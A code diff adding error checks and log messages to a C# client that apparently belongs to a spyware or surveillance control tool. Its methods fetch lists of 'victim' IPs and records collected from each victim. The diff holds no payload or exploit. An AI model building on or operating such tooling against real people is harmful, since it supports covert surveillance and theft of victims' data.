@@ -42,7 +42,15 @@ namespace ClientInterface
             await SendAsync(json);
             string response = await ReceiveAsync();
 
-            return SpySerializer.DeserializeResponse(response);
+            var result = SpySerializer.DeserializeResponse<object>(response);
+
+            if (result == null || result.Code != ResponseCode.Success)
+            {
+                Console.WriteLine($"[Client] Login failed. Code: {(int?)result?.Code}, Content: {result?.Content}");
+                return null;
+            }
+
+            return result;
         }
 
         public async Task<SpyResponse<IEnumerable<string>>?> GetVictimIpListAsync()
@@ -53,7 +61,15 @@ namespace ClientInterface
             await SendAsync(json);
             string response = await ReceiveAsync();
 
-            return SpySerializer.DeserializeResponse<IEnumerable<string>>(response);
+            var result = SpySerializer.DeserializeResponse<IEnumerable<string>>(response);
+
+            if (result == null || result.Code != ResponseCode.Success)
+            {
+                Console.WriteLine($"[Client] Failed to get victim IP list. Code: {(int?)result?.Code}, Content: {result?.Content}");
+                return null;
+            }
+
+            return result;
         }
 
         public async Task<SpyResponse<IEnumerable<VictimRecord>>?> GetVictimRecordsAsync(string victimIp)
@@ -64,8 +80,17 @@ namespace ClientInterface
             await SendAsync(json);
             string response = await ReceiveAsync();
 
-            return SpySerializer.DeserializeResponse<IEnumerable<VictimRecord>>(response);
+            var result = SpySerializer.DeserializeResponse<IEnumerable<VictimRecord>>(response);
+
+            if (result == null || result.Code != ResponseCode.Success)
+            {
+                Console.WriteLine($"[Client] Failed to get records for {victimIp}. Code: {(int?)result?.Code}, Content: {result?.Content}");
+                return null;
+            }
+
+            return result;
         }
+
 
 
         private async Task SendAsync(string data)
